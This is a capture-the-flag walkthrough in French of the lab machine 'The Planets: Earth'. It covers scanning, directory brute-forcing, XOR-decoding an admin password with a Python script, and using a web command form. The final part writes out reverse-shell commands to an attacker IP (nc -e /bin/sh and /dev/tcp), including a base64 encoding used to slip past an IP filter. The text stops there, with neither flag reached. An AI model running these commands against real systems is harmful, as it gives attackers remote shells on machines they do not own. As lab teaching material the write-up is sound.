
# The Planets : Earth par SirFlash

Sur cette machine virtuelle décrite comme facile mais un peu plus complexe que Mercury, il faut trouver un flag user et un flag root qui contiennent chacun un hash MD5.

## Analyse
Je vais dans un premier temps récupérer l'adresse IP de la machine virtuelle puis analyser celle-ci dans le but de trouver un point d'entrée.

### Recherche de l'adresse IP de la machine virtuelle
Pour récupérer l'adresse IP de la machine virtuelle, j'exécute la commande ```sudo netdiscover -i eth1 -r 192.168.56.0/24``` et je récupère son adresse : 192.168.56.102

### Recherche d'un point d'entrée
Je commence ma recherche afin de trouver un point d'entrée.

#### Recherche avec nmap
Je lance une analyse avec la commande ```nmap -e eth1 -A -p- -T4 192.168.56.102``` :
```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-22 06:13 EST
Nmap scan report for 192.168.56.102
Host is up (0.00057s latency).
Not shown: 65371 filtered tcp ports (no-response), 161 filtered tcp ports (host-unreach)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.6 (protocol 2.0)
| ssh-hostkey: 
|   256 5b:2c:3f:dc:8b:76:e9:21:7b:d0:56:24:df:be:e9:a8 (ECDSA)
|_  256 b0:3c:72:3b:72:21:26:ce:3a:84:e8:41:ec:c8:f8:41 (ED25519)
80/tcp  open  http     Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
|_http-title: Bad Request (400)
|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
443/tcp open  ssl/http Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
|_http-title: Test Page for the HTTP Server on Fedora
| http-methods: 
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=earth.local/stateOrProvinceName=Space
| Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local
| Not valid before: 2021-10-12T23:26:31
|_Not valid after:  2031-10-10T23:26:31
|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 187.23 seconds
```

Je constate qu'il y a 3 ports ouverts :
* 22/tcp (ssh) : OpenSSH 8.6 (protocol 2.0)
* 80/tcp (http) : Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
* 443/tcp (ssl/http) : Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)

Le certificat SSL contient également deux noms DNS :
* earth.local
* terratest.earth.local

J'ajoute ces deux noms DNS dans mon fichier ```/etc/hosts``` :
```
192.168.56.102 earth.local terratest.earth.local
```

### Analyse du port 80 et 443
Je lance un ```dirb http://earth.local``` et un ```dirb https://earth.local``` qui me permet de trouver la page ```https://earth.local/admin``` qui contient un lien vers la page ```http://earth.local/admin/login```.
Puis un ```dirb http://terratest.earth.local``` et un ```dirb https://terratest.earth.local``` qui me permet de trouver le fichier ```https://terratest.earth.local/robots.txt``` qui contient :
```
User-Agent: *
Disallow: /*.asp
Disallow: /*.aspx
Disallow: /*.bat
Disallow: /*.c
Disallow: /*.cfm
Disallow: /*.cgi
Disallow: /*.com
Disallow: /*.dll
Disallow: /*.exe
Disallow: /*.htm
Disallow: /*.html
Disallow: /*.inc
Disallow: /*.jhtml
Disallow: /*.jsa
Disallow: /*.json
Disallow: /*.jsp
Disallow: /*.log
Disallow: /*.mdb
Disallow: /*.nsf
Disallow: /*.php
Disallow: /*.phtml
Disallow: /*.pl
Disallow: /*.reg
Disallow: /*.sh
Disallow: /*.shtml
Disallow: /*.sql
Disallow: /*.txt
Disallow: /*.xml
Disallow: /testingnotes.*
```

Cette dernière ligne me semble intéressante.

En essayant quelques extensions, je trouve rapidement la présence du fichier ```https://terratest.earth.local/testingnotes.txt``` dont voici son contenu :
```
Testing secure messaging system notes:
*Using XOR encryption as the algorithm, should be safe as used in RSA.
*Earth has confirmed they have received our sent messages.
*testdata.txt was used to test encryption.
*terra used as username for admin portal.
Todo:
*How do we send our monthly keys to Earth securely? Or should we change keys weekly?
*Need to test different key lengths to protect against bruteforce. How long should the key be?
*Need to improve the interface of the messaging interface and the admin panel, it's currently very basic.
```

Le fichier ```https://terratest.earth.local/testdata.txt``` contient :
```
According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth's history, life appeared in the oceans and began to affect Earth's atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.
```

Avec toutes ces informations, j'ai développé un petit décodeur en Python :
```python
texte_code_hex = "2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a"
cle_ascii = "According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth's history, life appeared in the oceans and began to affect Earth's atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago."

def xor(c1, c2):
    return ''.join(format(int(a, 16) ^ int(b, 16), 'x') for a,b in zip(c1,c2))

cle_hex = cle_ascii.encode("utf-8").hex()
texte_code_hex = xor(texte_code_hex, cle_hex)
texte_code_ascii = bytes.fromhex(texte_code_hex).decode("ASCII")
print(texte_code_ascii)
```

Je récupère la chaîne suivante :
```
earthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimat
```

J'essaie de m'identifier avec :
- Username : terra
- Password : earthclimatechangebad4humans

Me voilà identifié !

Sur cette nouvelle page, je suis en présence d'un formulaire qui me permet d'exécuter des commandes :
- whoami => apache
- id => uid=48(apache) gid=48(apache) groups=48(apache)
- nc -e /bin/sh 192.168.56.101 7777

Avec cette dernière commande, j'ai le message ```Remote connections are forbidden``` qui s'affiche.
L'utilisation d'une adresse IP dans la commande est interdite !

Je vais donc contourner ce problème en encodant ma commande avec ```base64``` : ```echo "sh -i >& /dev/tcp/192.168.56.101/7777 0>&1" | base64
c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC41Ni4xMDEvNzc3NyAwPiYxCg==```

Puis je l'exécute de cette manière : ```echo "c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC41Ni4xMDEvNzc3NyAwPiYx" | base64 -d | sh```
